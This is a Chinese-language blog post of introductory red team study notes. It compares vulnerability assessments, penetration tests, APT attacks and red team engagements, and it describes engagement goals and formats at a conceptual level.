<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红队学习笔记-one | myift</title><meta name="author" content="dgh"><meta name="copyright" content="dgh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="红队基础知识漏洞评估和渗透测试限制漏洞评估这是最简单的安全评估形式，其主要目标是在网络中尽可能多的系统中识别尽可能多的漏洞。为此，可以做出让步以有效地实现这一目标。例如，攻击者的计算机可能在可用的安全解决方案中被列入允许列表，以避免干扰漏洞发现过程。这是有道理的，因为目标是查看网络上的每台主机并单独评估其安全状况，同时向公司提供关于修复工作重点的最多信息。 总而言之， 漏洞评估的重点是将主机作为单">
<meta property="og:type" content="article">
<meta property="og:title" content="红队学习笔记-one">
<meta property="og:url" content="http://example.com/2025/04/01/%E7%BA%A2%E9%98%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-one/index.html">
<meta property="og:site_name" content="myift">
<meta property="og:description" content="红队基础知识漏洞评估和渗透测试限制漏洞评估这是最简单的安全评估形式，其主要目标是在网络中尽可能多的系统中识别尽可能多的漏洞。为此，可以做出让步以有效地实现这一目标。例如，攻击者的计算机可能在可用的安全解决方案中被列入允许列表，以避免干扰漏洞发现过程。这是有道理的，因为目标是查看网络上的每台主机并单独评估其安全状况，同时向公司提供关于修复工作重点的最多信息。 总而言之， 漏洞评估的重点是将主机作为单">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/png.png">
<meta property="article:published_time" content="2025-04-01T12:18:54.000Z">
<meta property="article:modified_time" content="2025-04-01T12:21:28.977Z">
<meta property="article:author" content="dgh">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/image/png.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "红队学习笔记-one",
  "url": "http://example.com/2025/04/01/%E7%BA%A2%E9%98%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-one/",
  "image": "http://example.com/image/png.png",
  "datePublished": "2025-04-01T12:18:54.000Z",
  "dateModified": "2025-04-01T12:21:28.977Z",
  "author": [
    {
      "@type": "Person",
      "name": "dgh",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/04/01/%E7%BA%A2%E9%98%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-one/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '红队学习笔记-one',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/png1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">myift</span></a><a class="nav-page-title" href="/"><span class="site-name">红队学习笔记-one</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">红队学习笔记-one</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-01T12:18:54.000Z" title="发表于 2025-04-01 20:18:54">2025-04-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-01T12:21:28.977Z" title="更新于 2025-04-01 20:21:28">2025-04-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="红队基础知识"><a href="#红队基础知识" class="headerlink" title="红队基础知识"></a>红队基础知识</h2><h3 id="漏洞评估和渗透测试限制"><a href="#漏洞评估和渗透测试限制" class="headerlink" title="漏洞评估和渗透测试限制"></a>漏洞评估和渗透测试限制</h3><h4 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h4><p>这是最简单的安全评估形式，其主要目标是在网络中尽可能多的系统中识别尽可能多的漏洞。为此，可以做出让步以有效地实现这一目标。例如，攻击者的计算机可能在可用的安全解决方案中被列入允许列表，以避免干扰漏洞发现过程。这是有道理的，因为目标是查看网络上的每台主机并单独评估其安全状况，同时向公司提供关于修复工作重点的最多信息。</p>
<p>总而言之， 漏洞评估的重点是将主机作为单个实体进行漏洞扫描，以便<strong>识别</strong>安全缺陷并部署有效的安全措施，以优先<strong>方式保护</strong>网络。大部分工作可以使用自动化工具完成，并由作员执行，不需要太多的技术知识。</p>
<p>例如，如果要通过网络运行漏洞评估 ，通常会尝试扫描尽可能多的主机，但实际上根本不会尝试利用任何漏洞：</p>
<h4 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h4><p>除了扫描每台主机的漏洞之外，我们通常还需要了解它们如何影响我们的整个网络。渗透测试允许渗透测试人员通过执行其他步骤来探索攻击者对整个网络的影响，从而增加漏洞评估，这些步骤包括：</p>
<ul>
<li>尝试<strong>利用</strong>在每个系统上发现的漏洞。这一点很重要，因为有时系统中可能存在漏洞，但适当的补偿控制可以有效地防止其被利用。它还允许我们测试是否可以使用检测到的漏洞来破坏给定的主机。</li>
<li>在任何受感染的主机上执行<strong>利用后</strong>任务，使我们能够发现是否可以从中提取任何有用的信息，或者我们是否可以使用它们来转向以前无法从我们所在的位置访问的其他主机。</li>
</ul>
<p>渗透测试可能从扫描漏洞开始，就像常规漏洞评估一样，但会提供有关攻击者如何链接漏洞以实现特定目标的更多信息。虽然它的重点仍然是<strong>识别</strong>漏洞和建立<strong>保护</strong>网络的措施，但它也将网络视为一个完整的生态系统，以及攻击者如何从其组件之间的交互中获利。</p>
<p>如果我们要使用与之前相同的示例网络执行渗透测试，除了扫描网络上的所有主机以查找漏洞之外，我们还会尝试确认它们是否可以被利用，以显示攻击者可能对网络产生的影响：</p>
<p>通过分析攻击者如何在我们的网络中移动，我们还可以对可能的安全措施绕过方式以及在一定程度上检测真实威胁行为者的能力获得基本的见解。不过，这种能力是有限的，因为渗透测试的范围通常很广，而且渗透测试人员并不太在意是否会触发大量安全设备的警报，因为此类项目通常受到时间限制，要求我们在短时间内对网络进行测试。</p>
<h4 id="高级持续性威胁（APT）及为何常规渗透测试不足以应对"><a href="#高级持续性威胁（APT）及为何常规渗透测试不足以应对" class="headerlink" title="高级持续性威胁（APT）及为何常规渗透测试不足以应对"></a><strong>高级持续性威胁（APT）及为何常规渗透测试不足以应对</strong></h4><p><strong>传统的安全测试（如渗透测试）可以发现大多数技术漏洞，但它们在应对真实攻击者时存在一定的局限性</strong>。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/f9c16ff60c1412eefd77f12253643bab.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;f9c16ff60c1412eefd77f12253643bab.png"></p>
<p><strong>Time Constraints（时间限制）</strong> ⏰</p>
<ul>
<li>传统安全评估（如渗透测试）通常是在<strong>短时间内进行的</strong>，测试人员无法像真实攻击者一样长时间潜伏、研究目标，导致许多隐蔽性强的攻击手法无法被发现。</li>
</ul>
<p><strong>Budget（预算）</strong> 💰</p>
<ul>
<li>许多企业在安全预算上有限，可能<strong>无法进行全面的安全评估</strong>，尤其是涉及深度模拟真实攻击（如红队演练）的测试成本较高。</li>
</ul>
<p><strong>Limited Scope（范围有限）</strong> 🎯</p>
<ul>
<li>渗透测试通常有<strong>明确的范围</strong>，测试人员只能在<strong>规定的系统、IP 段或应用程序</strong>内进行测试，而真实攻击者没有这样的限制，他们可能会利用供应链攻击、社会工程学等手段。</li>
</ul>
<p><strong>Non-disruptive（非破坏性）</strong> 🔥</p>
<ul>
<li>传统安全评估通常要求<strong>不会影响业务运营</strong>，因此不会进行一些高风险的测试（如持久化攻击、破坏性利用），而真实攻击者不会有这种顾虑，他们的目标是<strong>长期潜伏、完全控制系统</strong>。</li>
</ul>
<p><strong>Heavy IT Focus（过于关注 IT 层面）</strong> 🌍💻</p>
<ul>
<li>传统安全测试<strong>主要关注 IT 设备、服务器和软件漏洞</strong>，但真正的攻击可能涉及<strong>物理安全、社会工程学、供应链攻击等非技术手段</strong>，而这些往往超出了渗透测试的范围。</li>
</ul>
<hr>
<h5 id="渗透测试-vs-真实攻击的关键区别"><a href="#渗透测试-vs-真实攻击的关键区别" class="headerlink" title="渗透测试 vs. 真实攻击的关键区别"></a>渗透测试 vs. 真实攻击的关键区别</h5><h6 id="1-渗透测试的局限性"><a href="#1-渗透测试的局限性" class="headerlink" title="(1) 渗透测试的局限性"></a>(1) 渗透测试的局限性</h6><ol>
<li><strong>渗透测试是“吵闹的”（LOUD）</strong> 🔊<ul>
<li>渗透测试人员通常不会刻意保持隐蔽，而是尽可能<strong>快速发现漏洞</strong>。</li>
<li>他们不怕被检测到，因为他们的目的是<strong>尽快找出所有可能的安全问题</strong>，而不是真正模拟攻击者的隐秘行动。</li>
<li>但<strong>真实的攻击者会极力隐藏行踪</strong>，利用“低慢攻击（Low &amp; Slow Attacks）”来绕过安全监测。</li>
</ul>
</li>
<li><strong>非技术攻击（如社工攻击、物理入侵）可能被忽视</strong> 🎭<ul>
<li>渗透测试一般<strong>只关注技术层面</strong>，例如漏洞利用、权限提升等。</li>
<li>但<strong>真正的攻击者可能会利用社会工程学（如钓鱼邮件）或物理入侵（如尾随进入机房）来获取访问权限</strong>。</li>
<li>这意味着，<strong>即使技术安全措施很完善，企业仍可能因人为因素而被攻击</strong>。</li>
</ul>
</li>
<li><strong>安全机制可能被临时放宽</strong> 🛑<ul>
<li>为了提高渗透测试的效率，企业可能会<strong>暂时禁用 IDS&#x2F;IPS（入侵检测&#x2F;防御系统）、WAF（Web 应用防火墙）等安全措施</strong>。</li>
<li>这有助于测试人员专注于查找系统漏洞，而不是花时间绕过安全防御。</li>
<li>但<strong>真实攻击者不会遇到这些“特权”</strong>，他们必须想办法真正绕过这些安全机制。</li>
<li>这使得渗透测试<strong>无法真实反映攻击者如何突破企业防御</strong>。</li>
</ul>
</li>
</ol>
<hr>
<h6 id="2-真实攻击者（尤其是APT）的特点"><a href="#2-真实攻击者（尤其是APT）的特点" class="headerlink" title="(2) 真实攻击者（尤其是APT）的特点"></a><strong>(2) 真实攻击者（尤其是APT）的特点</strong></h6><ol>
<li><strong>不受道德或规则约束</strong> ❌<ul>
<li>渗透测试人员有<strong>道德和法律约束</strong>，必须遵守测试范围，而真正的攻击者<strong>可以采用任何手段</strong>。</li>
<li>例如，APT 可能使用<strong>零日漏洞、社工攻击、长时间潜伏</strong>等方式，而这些往往不在普通渗透测试的范围内。</li>
</ul>
</li>
<li><strong>高级持续性威胁（APT）是现代最大威胁之一</strong> ⚠️<ul>
<li>APT（Advanced Persistent Threats，高级持续性威胁）通常由<strong>国家级黑客组织或有组织犯罪团伙</strong>支持，目标通常是<strong>关键基础设施、金融机构、政府机构</strong>。</li>
<li>他们的攻击手法包括：<ul>
<li>通过<strong>钓鱼邮件</strong>获取初始访问权限。</li>
<li><strong>利用零日漏洞</strong>绕过安全机制。</li>
<li><strong>长期潜伏</strong>在受害网络中，隐秘地进行数据窃取或控制系统。</li>
</ul>
</li>
<li><strong>这些攻击可能持续数月甚至数年，传统渗透测试难以模拟这种攻击方式</strong>。</li>
</ul>
</li>
</ol>
<hr>
<h6 id="2-APT-相关的现实问题"><a href="#2-APT-相关的现实问题" class="headerlink" title="2. APT 相关的现实问题"></a><strong>2. APT 相关的现实问题</strong></h6><p>企业面对 APT 可能面临以下挑战：</p>
<ul>
<li><strong>如果APT已经潜伏了几个月，企业能检测到吗？</strong></li>
<li><strong>如果攻击者利用了社工攻击（如员工误点恶意邮件），企业能阻止吗？</strong></li>
<li><strong>如果APT利用的是零日漏洞（Zero-Day），企业的安全策略是否足够？</strong></li>
<li><strong>传统的渗透测试能帮助企业应对这些挑战吗？</strong></li>
</ul>
<p>这些问题表明，<strong>传统渗透测试可能不足以真正模拟 APT 攻击</strong>，因此需要更高级的安全评估方法。</p>
<hr>
<h6 id="3-解决方案：红队演练（Red-Team-Engagements）"><a href="#3-解决方案：红队演练（Red-Team-Engagements）" class="headerlink" title="3. 解决方案：红队演练（Red Team Engagements）"></a>3. 解决方案：红队演练（Red Team Engagements）</h6><p><strong>红队演练（Red Team Engagements）</strong> 是为了更真实地模拟攻击者的行为，<strong>弥补渗透测试的不足</strong>，主要特点包括：</p>
<ul>
<li><strong>隐蔽性强</strong>：红队会像真实攻击者一样，尝试<strong>长时间不被发现</strong>。</li>
<li><strong>使用各种攻击手法</strong>：包括技术漏洞利用、社工攻击、供应链攻击等。</li>
<li><strong>目标明确</strong>：通常是<strong>长期潜伏、控制关键系统或获取敏感数据</strong>，而不是单纯查找漏洞。</li>
<li><strong>不受安全机制放宽的影响</strong>：企业不会关闭安全机制，红队必须真正绕过它们。</li>
</ul>
<hr>
<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h6><table>
<thead>
<tr>
<th>对比项</th>
<th>传统渗透测试（Pentesting）</th>
<th>真实攻击（APT）</th>
<th>红队演练（Red Team）</th>
</tr>
</thead>
<tbody><tr>
<td><strong>隐蔽性</strong></td>
<td>很“吵闹”，容易被检测</td>
<td>极度隐蔽，长期潜伏</td>
<td>尽可能模拟APT，保持隐蔽</td>
</tr>
<tr>
<td><strong>攻击方式</strong></td>
<td>主要是技术漏洞</td>
<td>可能涉及社工、物理攻击</td>
<td>结合技术+社工+物理</td>
</tr>
<tr>
<td><strong>安全机制</strong></td>
<td>可能被临时放宽</td>
<td>必须绕过真实防御</td>
<td>必须绕过真实防御</td>
</tr>
<tr>
<td><strong>目标</strong></td>
<td>发现尽可能多的漏洞</td>
<td>获取长期访问控制</td>
<td>真实模拟攻击者目标</td>
</tr>
<tr>
<td><strong>限制</strong></td>
<td>受道德、法律和测试范围约束</td>
<td>没有限制</td>
<td>受企业授权范围约束，但比渗透测试更接近真实攻击</td>
</tr>
</tbody></table>
<p>** 结论: **</p>
<ul>
<li>传统渗透测试<strong>适用于发现漏洞</strong>，但无法模拟真正的APT攻击。</li>
<li><strong>红队演练是更高级的安全评估方法，可以更真实地检测企业的安全防御能力</strong>。</li>
<li>现代企业要提升安全性，<strong>不能仅依赖渗透测试，而需要结合红队演练、威胁狩猎（Threat Hunting）等方式</strong>。</li>
</ul>
<h3 id="红队演练"><a href="#红队演练" class="headerlink" title="红队演练"></a>红队演练</h3><h4 id="红队演练的演变及其与传统渗透测试的区别"><a href="#红队演练的演变及其与传统渗透测试的区别" class="headerlink" title="红队演练的演变及其与传统渗透测试的区别"></a><strong>红队演练的演变及其与传统渗透测试的区别</strong></h4><h5 id="1-红队演练的核心目标"><a href="#1-红队演练的核心目标" class="headerlink" title="1. 红队演练的核心目标"></a><strong>1. 红队演练的核心目标</strong></h5><p>为了应对不断变化的网络安全威胁，<strong>红队演练（Red Team Engagements）</strong> 诞生，其目的是<strong>从传统渗透测试（Penetration Testing）转向更关注检测和响应能力的安全评估</strong>。</p>
<ul>
<li><strong>传统渗透测试</strong> 主要关注<strong>发现漏洞</strong>，帮助组织修复安全缺陷。</li>
<li><strong>红队演练</strong> 则着重于<strong>检测（Detection）与响应（Response）</strong>，评估防御团队（蓝队）的实际应对能力。</li>
<li><strong>两者是互补关系，而非替代关系</strong>。</li>
</ul>
<hr>
<h5 id="2-红队概念的军事来源"><a href="#2-红队概念的军事来源" class="headerlink" title="2. 红队概念的军事来源"></a><strong>2. 红队概念的军事来源</strong></h5><p>“红队（Red Team）” 一词最早来源于<strong>军事演习</strong>，在军事背景下，</p>
<ul>
<li>“红队” 扮演攻击方，模拟真实的敌对势力，测试防御方的应对能力。</li>
<li>“蓝队（Blue Team）” 作为防御方，负责侦测、分析并阻止攻击行为。</li>
</ul>
<p>在<strong>网络安全领域</strong>，这一概念被引入，红队演练通过模拟真实黑客的<strong>战术、技术和程序（TTPs - Tactics, Techniques, and Procedures）</strong>，来评估<strong>蓝队的防御能力，并改进安全控制措施</strong>。</p>
<hr>
<h5 id="3-红队演练的流程"><a href="#3-红队演练的流程" class="headerlink" title="3. 红队演练的流程"></a><strong>3. 红队演练的流程</strong></h5><p>每次红队演练都会<strong>定义明确的目标</strong>（常被称为“<strong>王冠上的明珠（Crown Jewels）</strong>”或“<strong>旗帜（Flags）</strong>”），目标通常包括：</p>
<ul>
<li><strong>攻破某个关键服务器</strong>（如内网服务器、核心数据库）。</li>
<li><strong>窃取敏感数据</strong>（如财务记录、客户信息、员工凭据）。</li>
<li><strong>控制某个关键业务流程</strong>（如修改交易记录、劫持邮件系统）。</li>
</ul>
<p>🔹 <strong>与传统渗透测试不同</strong>：<br> 在红队演练中，<strong>蓝队（防御团队）通常不会被提前告知</strong>，以<strong>避免人为干预</strong>，确保防御能力的真实评估。</p>
<ul>
<li>红队需要<strong>尽可能隐蔽</strong>地执行攻击，不留下明显的痕迹。</li>
<li><strong>不需要扫描整个网络</strong>，而是寻找<strong>一条最有效的攻击路径</strong>，像真实的黑客一样，利用最少的攻击面实现目标。</li>
<li>他们必须绕过 <strong>防火墙、杀毒软件（AV）、终端检测与响应（EDR）、入侵防御系统（IPS）等安全机制</strong>。</li>
</ul>
<hr>
<h5 id="4-真实案例：目标是入侵内网服务器"><a href="#4-真实案例：目标是入侵内网服务器" class="headerlink" title="4. 真实案例：目标是入侵内网服务器"></a><strong>4. 真实案例：目标是入侵内网服务器</strong></h5><p>假设红队的目标是<strong>入侵企业内部的 Intranet 服务器</strong>，攻击流程可能如下：</p>
<p>1️⃣ <strong>获取初始访问权限</strong>：</p>
<ul>
<li>可能使用<strong>钓鱼邮件</strong>（Phishing）诱骗员工执行恶意代码。</li>
<li>也可能利用外部暴露的<strong>Web 应用漏洞</strong>（如 SQL 注入、远程代码执行）。</li>
</ul>
<p>2️⃣ <strong>权限提升 &amp; 横向移动</strong>：</p>
<ul>
<li>利用<strong>凭据窃取技术</strong>（如 Mimikatz）获取更高权限。</li>
<li>通过 SMB、RDP、PsExec 在网络内扩展。</li>
</ul>
<p>3️⃣ <strong>隐蔽渗透 &amp; 规避检测</strong>：</p>
<ul>
<li>使用 C2（Command &amp; Control）服务器保持远程访问。</li>
<li>规避 EDR、SIEM 等安全监测工具。</li>
</ul>
<p>4️⃣ <strong>达成目标 &amp; 数据外泄</strong>：</p>
<ul>
<li>窃取数据库中的<strong>客户数据</strong>或<strong>财务信息</strong>。</li>
<li>控制核心业务流程，如篡改企业邮件系统。</li>
</ul>
<p>5️⃣ <strong>清理痕迹 &amp; 反馈报告</strong>：</p>
<ul>
<li>删除日志、清除恶意文件，确保攻击难以被溯源。</li>
<li><strong>最终，红队会向企业提供详细的安全评估报告，以帮助蓝队提升防御能力。</strong></li>
</ul>
<hr>
<h5 id="5-关键点总结"><a href="#5-关键点总结" class="headerlink" title="5. 关键点总结"></a><strong>5. 关键点总结</strong></h5><p>✅ <strong>红队演练不是简单的漏洞扫描，而是全面测试安全体系的“实战能力”</strong>。<br> ✅ <strong>目标是提高检测和响应能力，而非仅仅发现漏洞</strong>。<br> ✅ <strong>模拟 APT（高级持续性威胁）黑客行为，长期潜伏、低调行动，绕过安全防御</strong>。<br> ✅ <strong>蓝队通常不会提前知情，以保证测试的真实性</strong>。<br> ✅ <strong>红队成功的关键在于隐蔽行动，找到最短路径完成目标，而非大范围扫描漏洞</strong>。</p>
<p>通过红队演练，企业可以有效衡量自身的安全防御能力，并不断优化安全策略，以应对真正的网络攻击威胁。</p>
<h4 id="红队演练的最终目标及不同方式"><a href="#红队演练的最终目标及不同方式" class="headerlink" title="红队演练的最终目标及不同方式"></a><strong>红队演练的最终目标及不同方式</strong></h4><h5 id="1-红队的最终目标：提升蓝队的检测与响应能力"><a href="#1-红队的最终目标：提升蓝队的检测与响应能力" class="headerlink" title="1. 红队的最终目标：提升蓝队的检测与响应能力"></a><strong>1. 红队的最终目标：提升蓝队的检测与响应能力</strong></h5><p>红队演练的<strong>最终目的</strong>，<strong>绝不是“打败”蓝队</strong>，而是通过模拟真实攻击者的<strong>战术、技术与程序（TTPs）</strong>，</p>
<ul>
<li><strong>帮助蓝队提高检测和响应能力</strong>，增强组织面对真实攻击时的安全防御能力。</li>
<li><strong>优化现有的安全机制</strong>，如果必要，调整或增加新的安全控制措施，以提高对威胁的检测能力。</li>
</ul>
<hr>
<h5 id="2-红队相比渗透测试的进阶提升"><a href="#2-红队相比渗透测试的进阶提升" class="headerlink" title="2. 红队相比渗透测试的进阶提升"></a><strong>2. 红队相比渗透测试的进阶提升</strong></h5><p>红队演练相比<strong>传统渗透测试</strong>，在**攻击面（Attack Surfaces）**的考虑上更加全面，涵盖多个维度：</p>
<p>✅ <strong>技术基础设施（Technical Infrastructure）</strong></p>
<ul>
<li>这一部分与传统渗透测试类似，仍然会<strong>寻找系统和网络中的技术漏洞</strong>。</li>
<li>但相比之下，<strong>红队更强调隐蔽性和规避检测</strong>，模拟高级攻击者的低调行动。</li>
</ul>
<p>✅ <strong>社会工程学（Social Engineering）</strong></p>
<ul>
<li>通过 <strong>钓鱼邮件（Phishing）、电话社交工程（Vishing）、社交媒体诱导</strong> 等方式，</li>
<li>诱骗目标泄露敏感信息（如登录凭据、内部文件）。</li>
<li>这类攻击方式在真实攻击场景中极为常见，APT 组织尤其擅长利用社会工程学手段。</li>
</ul>
<p>✅ <strong>物理入侵（Physical Intrusion）</strong></p>
<ul>
<li><strong>锁具破解（Lockpicking）</strong>：利用开锁工具突破物理门禁。</li>
<li><strong>RFID 克隆</strong>：拷贝门禁卡权限，进入机房等受限区域。</li>
<li><strong>电子访问控制漏洞</strong>：绕过电子门禁系统（如磁卡、指纹识别等）。</li>
</ul>
<hr>
<h5 id="3-红队演练的不同执行方式"><a href="#3-红队演练的不同执行方式" class="headerlink" title="3. 红队演练的不同执行方式"></a><strong>3. 红队演练的不同执行方式</strong></h5><p>红队演练可以根据<strong>组织的资源和需求</strong>，选择不同的执行方式：</p>
<p>🔴 <strong>全面演练（Full Engagement）</strong></p>
<ul>
<li>这是最完整的攻击模拟，<strong>从初始渗透到最终目标的达成</strong>，完全模拟攻击者的完整工作流程。</li>
<li>适用于<strong>需要全方位测试安全体系</strong>的组织。</li>
</ul>
<p>🔴 <strong>假设入侵（Assumed Breach）</strong></p>
<ul>
<li>直接假设攻击者已经突破了某些安全防线，<strong>跳过初始渗透阶段</strong>。</li>
<li>例如，红队可能直接获得<strong>员工的凭据</strong>或<strong>内网某台工作站的访问权限</strong>，然后评估能否进一步扩展权限、获取敏感数据等。</li>
<li>这种方式主要用于<strong>评估企业内部的检测和响应能力</strong>，特别是<strong>内网安全策略</strong>。</li>
</ul>
<p>🔴 <strong>桌面推演（Table-top Exercise）</strong></p>
<ul>
<li>采用<strong>模拟讨论的方式</strong>，由红队和蓝队在会议室<strong>探讨不同威胁场景</strong>，并评估如何应对。</li>
<li>适用于<strong>无法进行实战演练</strong>的情况，如高度敏感的生产环境或<strong>资源受限</strong>的企业。</li>
</ul>
<hr>
<h4 id="4-关键点总结"><a href="#4-关键点总结" class="headerlink" title="4. 关键点总结"></a><strong>4. 关键点总结</strong></h4><p>✅ <strong>红队的目标不是打败蓝队，而是帮助其提升检测和响应能力。</strong><br> ✅ <strong>红队比渗透测试更全面，涵盖技术漏洞、社会工程、物理安全等多个攻击面。</strong><br> ✅ <strong>红队演练方式多样，可根据资源选择全面演练、假设入侵或桌面推演。</strong><br> ✅ <strong>最终目的是提高企业整体安全防御水平，使其能有效应对真实的网络攻击。</strong></p>
